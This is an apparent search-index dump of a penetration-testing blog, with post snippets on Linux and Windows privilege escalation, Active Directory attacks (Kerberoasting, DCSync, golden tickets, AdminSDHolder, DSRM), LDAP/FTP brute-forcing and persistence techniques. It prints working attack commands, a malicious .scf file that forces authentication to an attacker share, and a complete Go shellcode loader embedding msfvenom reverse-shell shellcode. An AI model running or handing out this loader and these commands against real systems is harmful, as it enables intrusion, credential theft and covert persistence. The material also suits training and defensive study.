crontab /etc/crontabWe will locate the full path of overwrite.sh script and examine it permissions.Well…we have write permission on it, which means we can be able to write our own payload in it so that to be executed automatically by a cronjob.This will allow us to obtain root shell because the script is set to run with root privilege.ExploitationLet’s open the script overwrite.sh and add our own reverse shell payload.Now we will save it and setup our reverse shell listener.Well…As you can see, we have obtained a shell with root privilege." }, { "title": "Cron Jobs - PATH Environment Variable", "url": "/posts/linprivcronen/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Cron Jobs - PATH Environment VariableEnumerationWe are going to exploit PATH Environment Variable to escalate our privileges to root. Let’s check the content of a crontab /etc/crontabAs you can see, the PATH variable starts with /home/user, which is our current user’s home directory . Since we have write permission to the directory, we can create a file with thesame name as overwrite.sh so that to be executed by the cronjab. This is possible because overwrite.sh script is not configured with it full path and it set to run with root privilege , thereby allowing us to hijack it.ExploitationLet’s create a script overwrite.sh with a reverse shell payload and place it in our home directory, so that to be executed automatically by cronjob.We will setup a reverse shell listener and wait for an incoming connection.Well…As you can see, we have obtained a shell with root privilege." }, { "title": "Ldap Pentesting", "url": "/posts/ldap/", "categories": "Infrastructure Pentesting, Ldap", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "LdapThe Lightweight Directory Access Protocol (LDAP) is a directory service protocol that runs on a layer above the TCP/IP stack. It provides a mechanism used to connect to, search, and modify Internet directories. It runs on port 389/tcp by default.EnumerationScanning With NmapWe can use nmap to scan ldap protocol.nmap -sT -sV -Pn -p 389 [target_host]Above image shows ldap was running on port 389/tcp on our target.Bruteforcing LdaphydraUsing hydra , we can bruteforce credentials of ldap protocol.hydra -l [username] -P [/path/to/password/wordlist] ldap2://[target_ip]In the above image we were able to get a valid credential krobot:kPassword@123.ExploitationDump all domain informationSince we got valid credentials, we can extract everything from our target domain using ldapsearch.ldapsearch -x -D &#39;[domain\\username]&#39; -w &#39;[password]&#39; -b &#39;dc=[subdomain],dc=[tld]&#39; -H ldap://[target_ip]Extract Users .ldapsearch -x -D &#39;[domain\\username]&#39; -w &#39;[password]&#39; -b &#39;cn=users,dc=[subdomain],dc=[tld]&#39; -H ldap://[target_ip]Extract Information Of A Specific Userldapsearch -x -D &#39;[domain\\username]&#39; -w &#39;[password]&#39; -b &#39;cn=[target_user],cn=users,dc=[subdomain],dc=[tld]&#39; -H ldap://[target_ip]Extract Computersldapsearch -x -D &#39;[domain\\username]&#39; -w &#39;[password]&#39; -b &#39;cn=computers,dc=[subdomain],dc=[tld]&#39; -H ldap://[target_ip]SniffingThe traffic sent to and received from ldap is not encrypted. We can leverage this to retrieve a clear-text credential.WiresharkWe can use wireshark to sniff ldap traffic.Analysing ldap traffic revealed the clear-text credential of ldapReferences https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/lightweight-directory-access-protocol-ldap-api https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" }, { "title": "Kerberoasting", "url": "/posts/kerbr/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "KerberoastingKerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. Kerberos uses NTLM hash of the requested Service for encrypting KRB_TGS ticket for given service principal names (SPNs). When a domain user sent a request for TGS ticket to domain controller KDC for any service that has registered SPN, the KDC generates the KRB_TGS without identifying the user authorization against the requested service. Therefore, attacker may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to brute force.EnumerationImpacketTo execute a Kerberoasting attack, we need to obtain the valid credential of an authenticated user, which in this case we have usman:uPassword@123. so we are going to use GetUserSPNs.py of impacket to request TGS for available spns.We have retrieved TGS from the domain controller and saved it in a file.BloodHoundWe can get thesame result with bloodhoundExploitationWith the TGS retrieved, we can proceed to crack them using hashcat.hashcat -a 0 -m 13100 [TGS] [wordlist]Great!. We were able to crack them.References https://www.crowdstrike.com/cybersecurity-101/kerberoasting/" }, { "title": "Kerberos Pentesting", "url": "/posts/kerb/", "categories": "Infrastructure Pentesting, Kerberos", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "KerberosKerberos is an authentication protocol that is used to verify the identity of a user or host. It runs on port 88/tcp by default.EnumerationScanning With NmapWe can use nmap to scan kerberos protocol.nmap -Pn -sS -sV -p 88 [target_host]Above image shows kerberos was running on port 88/tcp on our target.Username EnumerationWe can use kerbrute to enumerate usernames via kerberos protocol.To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts.kerbrute userenum -d [domain] --dc [dc_ip] [users_file]As you can see we were able to get valid usernames.References https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88 https://github.com/ropnop/kerbrute" }, { "title": "DCSync On Domain", "url": "/posts/idcsync/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "DCSyncDCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators.EnumerationPowerViewDCSync EnumerationWe will get current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which we have DCSync right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[our_current_user_sid]&quot;) -and ($_.objectacetype -like &quot;*DS-Replication-*&quot;)}Below image shows the current user usman has DCSync right on Domain group.BloodHoundWe can also get thesame result using bloodhound.Below image shows the current user usman has DCSync right on Domain group.ExploitationMimikatzWe will execute mimikatz ./mimikatz.exe, then dump password hash of administrator by executing lsadump::dcsync /domain:cyber.local /user:Administrator.In the above image, we were able to dump password hash of Administrator.We can also dump password hash of krbtgt account by changing the user to krbtgt as follows:lsadump::dcsync /domain:cyber.local /user:krbtgt.References https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "Golden Ticket", "url": "/posts/golden/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Golden TicketIs an attack that allows attacker who has KRBTGT account password hash to forge Kerberos ticket-granting tickets (TGT) that will enable him to generate authentication material for any account in Active Directory. This ticket is known as golden ticket.ExploitationLet’s try to get powershell session of domain controller .As you can see, we were not able to access it because we didn’t have required privileges. Now we will forge the golden ticket to see if we can access it.To forge golden ticket, we need to get KRBTGT password hash using any credential access technigues. We will execute dcsync attack to retrieve password hash of KRBTGT.With the password hash retrieved, we will load mimikatz and forge the golden ticket.We will then pass the ticket.Now Let’s try to get powershell session of domain controller again.Great.References https://attack.mitre.org/techniques/T1558/001/" }, { "title": "FTP Pentesting", "url": "/posts/ftp/", "categories": "Infrastructure Pentesting, FTP", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "FTPFile Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network. It runs on port 21 by default.EnumerationScanning With NmapWe can use nmap to scan ftp as well as to get the version of ftp running on our target system.nmap -sT -sV -p 21 [target_ip]Above image shows ftp is running on port 21/tcp on our target. It also reveals the version of ftp running, which was vsftpd 3.0.3.Anonymous LoginAn anonymous login is a process that allows a user to login to an ftp anonymously, by using anonymous as the username and password.If anonymous login is enabled in ftp, you can login to ftp using anonymous as the username and password.NmapWe can use the following nmap script to determine whether or not anonymous login is enabled on ftp.nmap -sT --script ftp-anon.nse -p 21 [target_ip]Above image shows anonymous login is enabled.ftp clientWe can use ftp client to determine whether or not anonymous login is enabled on ftp.ftp [target_ip]Above image shows anonymous login is enabled.telnet clientWe can use telnet client to determine whether or not anonymous login is enabled on ftp.telnet [target_ip] 21USER anonymousPASS anonymousAbove image shows anonymous login is enabled.netcatWe can use netcat to determine whether or not anonymous login is enabled on ftp.nc [target_ip] 21USER anonymousPASS anonymousAbove image shows anonymous login is enabled.MetasploitWe can use metasploit to determine whether or not anonymous login is enabled on ftp.Above image shows anonymous login is enabled.Bruteforcing FTPhydraUsing hydra , we can bruteforce credentials of ftp, which if successful will allow us to access ftp.hydra -L [/path/to/username/wordlist] -P [/path/to/password/wordlist] ftp://[target_ip]In the above image we were able to get a valid credential user1:user1.SniffingBy default, the traffic sent to and received from ftp is not encrypted. An attacker can take advantage of this to sniff ftp traffic and retrieve a clear-text credential.WiresharkWe can use wireshark to sniff ftp traffic.Analysing ftp traffic revealed the clear-text credential of ftpReferences https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp" }, { "title": "Force Authentication", "url": "/posts/forcea/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Force AuthenticationAllows attacker to gather credential material by forcing a user to automatically provide authentication information through a mechanism in which they can intercept.ExploitationIn this lab, we will use this credential saifullah:sPassword@123 to enumerate our target machine.Let’s start by enumerating shares.Here we have Read, Write permission on devops share. Which means we can upload a file to the share.We will create a malicious file that will force the target machine to try to authenticate with our machine, which will allow us to obtain ntlm hash of the user.[Shell]Command=2IconFile=\\\\10.42.0.1\\\\share\\noexist.txt[Taskbar]Command=ToggleDesktopNow we will save it in .scf file and then upload it to the devops share.We will run responder and wait for someone to access the devops share.We can retrieve the ntlm hash of anyone who accesses the devops share.Let’s login to the victim machine and access the share.Let’s go back to our machine and check it.As you can see we have got ntlm hash of the administrator. We will save it and crack it using john.We were able to recover the ntlm hash.References https://attack.mitre.org/techniques/T1187/" }, { "title": "Directory Services Restore Mode (DSRM)", "url": "/posts/dsrm/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Directory Services Restore Mode (DSRM)All domain controllers have a hard-coded local Administrator account stored in their SAM file. This account and local database are not used or generally available when the domain controllers are running normally. While Active Directory Domain Controller is configured, the wizard prompts ask to enter a DSRM password for the local administrator. This password provides the administrator with a back door to the database in case something goes wrong later. DSRM persistence is possible where the systems do not change the DSRM password after AD installation or do not follow the standard of changing passwords regularly for DSRM.If an attacker is able to extract DSRM password hash, he can execute Pass-The-Hash attack to obtain system shell of an administrator.Note: This is a domain persistence technigue, therefore, assume we have compromised domain administrator&#39;s account and we are trying to achieve persistence in the domain.ExploitationSince we have compromised administrator account, we will login to domain controller, load mimikatz and then execute lsadump::sam to dump DSRM password hash.Now we have DSRM(local administrator) password hash.Once we have the local administrator password hash, we need to make some changes inside the Windows registry that will allow us to login into Domain Controller using DSRM hashes without rebooting the server. We will modify DsrmAdminLogonBehaviour registry key to have the value of 2, this is because by default DsrmAdminLogonBehaviour is set to 0 which means to allow log into the DC with a domain account only, while value 2 allow Logging to the DC with the DSRM account.Since we have set DsrmAdminLogonBehaviour to 2, we can load mimikatz and execute sekurlsa::pth /user:Administrator /rc4:[hash] /domain:cyber.local pass the hash and obtain system shell of local administrator.References" }, { "title": "Registry Autoruns", "url": "/posts/autorun/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Registry AutorunsWindows can be configured to run commands at startup, with elevated privileges. These AutoRuns are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.EnumerationWe are going to exploit registry AutoRuns to escalate our privileges to Admin. Let’s check our current user.Now, We will be using powerup.ps1 script to conduct an enumeration on the registry. Let’s import powerup.ps1 and execute Get-VulnAutoRun to get the available executable that are vulnerables.As you can see, program.exe is vulnerable , which means we can replace it with our own reverse shell executable.Let’s comfirm it with Get-Acl commandWell..We have Full Control on this executable. Which means we can be able to replace it other executable.ExploitationWe are going replace program.exe with our own reverse shell executable , which will be triggered whenever the system is restarted.Well…for the purpose of demonstration, we will setup our reverse shell listener, restart the system and then login with admin account.Well…As you can see, we have obtained shell with Admin privilege." }, { "title": "AS-REP Roasting", "url": "/posts/asroast/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "AS-REP RoastingAS-REP Roasting is a technique that allows retrieving password hashes for users that have Do not require Kerberos preauthentication.EnumerationImpacketTo execute an AS-REP Roasting attack, we need to obtain the valid username of an authenticated user, which in this case we have usman. so we are going to use GetNPUsers.py of impacket to execute the attack on usman, which if the he has Do not require preauthentication enabled will allow us to retrieve his TGT.We have retrieved TGT for usman from the domain controller and saved it in a file.Note: In this lab we executed the attack on a single user just for demonstration, but in reality, this attack is mostly done against a list of valid usernames.BloodHoundWe can also use bloodhound to view the list of accounts with Do not require pre-authentication.ExploitationWith the TGT retrieved, we can proceed to crack it using john.john --wordlist=[wordlist] [hash.txt]Great!. We were able to crack it.References https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/" }, { "title": "Registry — AlwaysInstallElevated", "url": "/posts/allwaysinstallelevated/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Registry — AlwaysInstallElevatedMSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.For this to work, two Registry settings must be enabled for this to work. The AlwaysInstallElevated value must be set to 1 for both the local machine:HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer and the current user: HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer. If either of these are missing or disabled, the exploit will not work.EnumerationLet’s check our current user.Now, We will be using powerup.ps1 script to conduct an enumeration on the registry. Let’s import powerup.ps1 and execute Get-RegAllwaysInstalledElevated.Well..As you can see, we got True, which means all the value of AlwaysInstallElevated are set to 1.ExploitationWe will create reverse shell msi file in our kali, transfer it to our target system and then execute msiexec /quiet /qn /i [path_to_reverseshell.msi] .Well…As you can see, we have obtained shell with SYSTEM privilege." }, { "title": "AdminSDHolder", "url": "/posts/adminsdholder/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "AdminSDHolderAdminSDHolder is a container that exists in every Active Directory domain for a special purpose. The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all “protected groups” in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins. Active Directory will take the ACL of the AdminSDHolder object and apply it to all protected users and groups periodically, in an effort to make sure the access to these objects is secure.If an attacker is able to manipulate the ACL for AdminSDHolder, then those permissions will automatically be applied to all protected objects.Note: This is a domain persistence technigue, therefore, assume we have compromised domain administrator&#39;s account and we are trying to achieve persistence in the domain.ExploitationSince we have compromised administrator account, we will manipulate acl of AdminSDHolder and give our user usman a GenericAll right on AdminSDHolder.add-objectacl -TargetIdentity AdminSDHolder -PrincipalIdentity usman -verbose -Rights AllAs you can see, usman has been given GenericAll right on AdminSDHolder. We will login to usman account and verify it.Great!. user usman has GenericAll on AdminSDHolder.Now after 60+ minutes, the changes will automatically be applied to all protected objects. But we can force the changes to apply immediately via ldp.exe by Modifying DN like so.Now , let’s confirm that the user usman has GenericAll on the protected objects.As you can see, user usman has GenericAll on all protected objects.Since usman has GenericAll on Domain Admins group, he can abuse it to obtain system shell of domain controller.References https://stealthbits.com/blog/20170619persistence-using-adminsdholder-and-sdprop/" }, { "title": "Local Account", "url": "/posts/localaccountpersist/", "categories": "Red Teaming, Persistence", "tags": "", "date": "2022-04-08 07:49:33 +0800", "snippet": "MITRE ID : T1136.001 Tactic : Persistence Platforms: Linux, Windows, macOSLocal AccountLocal accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Adversaries may create a local account to maintain access to victim systems.Local Account On Windowscommand promptCreating local user account using command promptsyntax net user [username] [password] /addnet user apt password123 /addCreating local admin using command promptsyntax net user [username] [password] /addnet localgroup [group] [username] /addnet user apt password123 /addnet localgroup administrators apt /addpowershellCreating local user account using powershellsyntax New-LocalUser -Name [username]New-LocalUser -Name aptLocal Account On LinuxCreating local account on linuxsyntax useradd -M -N -r -s /bin/bash [username]useradd -M -N -r -s /bin/bash aptMitigations Use multi-factor authentication for user and privileged accounts. Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries.References https://attack.mitre.org/techniques/T1136/001/ https://attack.mitre.org/mitigations/M1032/ https://attack.mitre.org/mitigations/M1026/ https://atomicredteam.io/persistence/T1136.001/" }, { "title": "SSH Authorized Keys", "url": "/posts/sshauthkeys/", "categories": "Red Teaming, Persistence", "tags": "", "date": "2022-04-08 07:49:33 +0800", "snippet": "MITRE ID : T1098.004 Tactic : Persistence Platforms: IaaS, Linux, macOSSSH Authorized KeysSSH Authorized Keys specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user’s home directory under ~/.ssh/authorized_keys. Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys, which will provide them with a persistent access to the compromised system.Steps Gain access to the target system. Generate your ssh-key pair(public and private keys using ssh-keygen). Insert your generated ssh public key(.pub) in the authorized_keys file of the target system(~/.ssh/authorized_keys). Login to the system with your generated ssh private keyGain access to the target system.shell on target systemuser1@user1-VirtualBox:~$ whoamiuser1user1@user1-VirtualBox:~$ pwd/home/user1user1@user1-VirtualBox:~$ cd .sshuser1@user1-VirtualBox:~/.ssh$ lsauthorized_keys known_hostsuser1@user1-VirtualBox:~/.ssh$ Generate your ssh-key pair(public and private keys using ssh-keygen)Generating ssh keys with ssh-keygen┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/cyberkhalid/.ssh/id_rsa): /home/cyberkhalid/pentest/data/persistEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/cyberkhalid/pentest/data/persistYour public key has been saved in /home/cyberkhalid/pentest/data/persist.pubThe key fingerprint is:SHA256:Co9FQudtbnGl9sPCILHbe7LMp+ygwP6FTIE1weM+qxs cyberkhalid@kaliThe key&#39;s randomart image is:+---[RSA 3072]----+| .=.o . || +o+ + o || ..o.= = + || .+ * * o || .o o S o + || . oo* o . . . || E +o= o . || . o.o = +. || ++o .Bo |+----[SHA256]-----+┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pubInsert your generated ssh public key(.pub) in the authorized_keys fileCopying pubic key(.pub) file┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pub┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ cat persist.pubssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kaliInserting public key in authorized_keys fileuser1@user1-VirtualBox:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kali&quot; &amp;gt;&amp;gt; authorized_keysuser1@user1-VirtualBox:~/.ssh$ Login to the systemNote: Make sure you change the permission of the private key to 400.(chmod 400 privatekeyfile).login using the generated private key┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pub┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ chmod 400 persist┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ ssh -i persist user1@10.42.0.21Enter passphrase for key &#39;persist&#39;: Last login: Tue Jun 7 00:30:09 2022 from 10.42.0.1user1@user1-VirtualBox:~$ whoamiuser1user1@user1-VirtualBox:~$ Mitigations Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using /etc/ssh/sshd_config. Restrict access to the authorized_keys file.References https://attack.mitre.org/techniques/T1098/004/ https://attack.mitre.org/techniques/T1098/004/ https://attack.mitre.org/tactics/TA0003/ https://www.ssh.com/academy/ssh/authorized-keys-file https://attack.mitre.org/techniques/T1098/004/" }, { "title": "Process Injection -&gt; CreateThread", "url": "/posts/createthread/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1055 Tactic : Defense Evasion Platforms: WindowsCreateThreadIs a function from Kernel32.dll windows module that Creates a thread to execute within the virtual address space of the calling process.Adversaries may leverage the Windows CreateThread function from Kernel32.dll to execute a malicious code within the virtual address space of the calling process.TechniguesVirtualAllocIs a function from kernel32.dll windows module that reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. We will use this function to allocate a memory block for our shellcode. By setting the page permissions to Read/Write, we can be able to copy our malicious code to the allocated memory space.RtlCopyMemoryIs a function from ntdll.dll windows module that copies the contents of a source memory block to a destination memory block. We will use this function to copy our shellcode to the allocated memory block. For this to work, the destination memory block must have atleast Read/Write permission set.VirtualProtectIs a function from kernel32.dll windows module that changes the protection on a region of committed pages in the virtual address space of the calling process.We will use this function to change the permission of the allocated memory block from Read/Write to Execute/Read, This permission will allow us to execute our shellcode.CreateThreadWe will use this function to create a thread that will execute our shellcode.WaitForSingleObjectIs a function from kernel32.dll windows module that waits until the specified object is in the signaled state or the time-out interval elapses.We will use this function to make the program wait for our shellcode to be executed before exiting.Codepackage mainimport ( &quot;encoding/hex&quot; &quot;errors&quot; &quot;log&quot; &quot;unsafe&quot; &quot;golang.org/x/sys/windows&quot;)// Reverse Shell Payload Generated With Msfvenomconst ( SHELLCODE = &quot;fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020003e8c0a82b0141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5&quot;)// Windows Modules And Functionsvar ( kernel32 = windows.NewLazySystemDLL(&quot;kernel32.dll&quot;) ntdll = windows.NewLazySystemDLL(&quot;ntdll.dll&quot;) virtualAlloc = kernel32.NewProc(&quot;VirtualAlloc&quot;) rtlCopyMemory = ntdll.NewProc(&quot;RtlCopyMemory&quot;) virtualProtect = kernel32.NewProc(&quot;VirtualProtect&quot;) createThread = kernel32.NewProc(&quot;CreateThread&quot;) waitForSingleObject = kernel32.NewProc(&quot;WaitForSingleObject&quot;))// Main Functionfunc main() { log.Println(&quot;[+] Process Injection: CreateThread...&quot;) // Convert SHELLCODE From hex String to bytes shellcodeByte := decodeShellcode(SHELLCODE) // Variables Needed To Invoke VirtualAlloc var shellcodeSize uint32 = uint32(len(shellcodeByte)) var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE var flProtect uint32 = windows.PAGE_READWRITE //Invoke VirtualAlloc To Allocate Memory Block For Our Shellcode bAddr, errVirtualAllocProc := virtualAllocProc(shellcodeSize, flAllocationType, flProtect) exitError(errVirtualAllocProc) log.Println(&quot;[+] Memory Allocated At: &quot;, uintptr(bAddr)) //Invoke RtlCopyMemory To Copy Our Shellocode To The Allocated Memory. errRtlCopyMemoryProc := rtlCopyMemoryProc(bAddr, &amp;amp;shellcodeByte[0], shellcodeSize) exitError(errRtlCopyMemoryProc) //Variable Needed To Invoke VirtualProtect var flNewProtect uint32 = windows.PAGE_EXECUTE_READ //Invoke VirtualProtect To Change Permission Of The Allocated Memory Block To Execute/Read errVirtualProtectProc := virtualProtectProc(bAddr, shellcodeSize, flNewProtect, &amp;amp;flProtect) exitError(errVirtualProtectProc) log.Println(&quot;[+] Permission Changed To PAGE_EXECUTE_READ&quot;) //Invoke CreateThread To Execute Our Shellcode tHandle, errCreateThreadProc := createThreadProc(bAddr) exitError(errCreateThreadProc) log.Println(&quot;[+] Shellcode Executed&quot;) //Invoke WaitForSingleObject To Wait For Our Shellcode To Be Executed Completely. errWaitForSingleObjectPro := waitForSingleObjectProc(tHandle) exitError(errWaitForSingleObjectPro)}// ExitError Handles Errorsfunc exitError(err error) { if err != nil { log.Fatal(err.Error()) }}//DecodeShellcode Convert Shellcode to Bytes Arrayfunc decodeShellcode(shellcode string) []byte { shellcodeByte, errShellcode := hex.DecodeString(shellcode) if errShellcode != nil { log.Fatal(&quot;[-] Error Decoding Shellcode&quot;) } return shellcodeByte}// virtualAllocProc Allocates Memory Blockfunc virtualAllocProc(dwSize, flAllocationType, flProtect uint32) (uintptr, error) { bAddr, _, errVirtualAlloc := virtualAlloc.Call( uintptr(0), uintptr(dwSize), uintptr(flAllocationType), uintptr(flProtect)) if errVirtualAlloc != nil &amp;amp;&amp;amp; errVirtualAlloc.Error() != &quot;The operation completed successfully.&quot; { return 0, errors.New(&quot;[-] Error: VirtualAlloc&quot;) } return bAddr, nil}// rtlCopyMemoryProc Copies Shellcode to The Allocated Memory Blockfunc rtlCopyMemoryProc(destination uintptr, source *byte, size_t uint32) error { _, _, errRtlCopyMemory := rtlCopyMemory.Call( uintptr(destination), uintptr(unsafe.Pointer(source)), uintptr(size_t)) if errRtlCopyMemory != nil &amp;amp;&amp;amp; errRtlCopyMemory.Error() != &quot;The operation completed successfully.&quot; { return errors.New(&quot;[-] Error: RtlCopyMemory&quot;) } return nil}// virtualProtectProc Changes The Permission To Execute/Readfunc virtualProtectProc(lpAddress uintptr, dwSize, flNewProtect uint32, floldProtect *uint32) error { _, _, errVirtualProtect := virtualProtect.Call( lpAddress, uintptr(dwSize), uintptr(flNewProtect), uintptr(unsafe.Pointer(floldProtect))) if errVirtualProtect != nil &amp;amp;&amp;amp; errVirtualProtect.Error() != &quot;The operation completed successfully.&quot; { return errors.New(&quot;[-] Error: VirtualProtect&quot;) } return nil}// createThreadProc Executes Shellcodefunc createThreadProc(lpStartAddress uintptr) (uintptr, error) { tHandle, _, errCreateThread := createThread.Call( uintptr(0), uintptr(0), lpStartAddress, uintptr(0), uintptr(0), uintptr(0)) if errCreateThread != nil &amp;amp;&amp;amp; errCreateThread.Error() != &quot;The operation completed successfully.&quot; { return tHandle, errors.New(&quot;[-] Error: CreateThread&quot;) } return tHandle, nil}// waitForSingleObjectProc Wait For Shellcode.func waitForSingleObjectProc(tHandle uintptr) error { _, _, errWaitForSingleObject := waitForSingleObject.Call( tHandle, 0xFFFFFFFF) if errWaitForSingleObject != nil &amp;amp;&amp;amp; errWaitForSingleObject.Error() != &quot;The operation completed successfully.&quot; { return errors.New(&quot;[-] Error: WaitForSingleObject&quot;) } return nil}ExecutionMitigations Behavior Prevention on Endpoint. Privileged Account Management.References https://attack.mitre.org/techniques/T1055/ https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject " }, 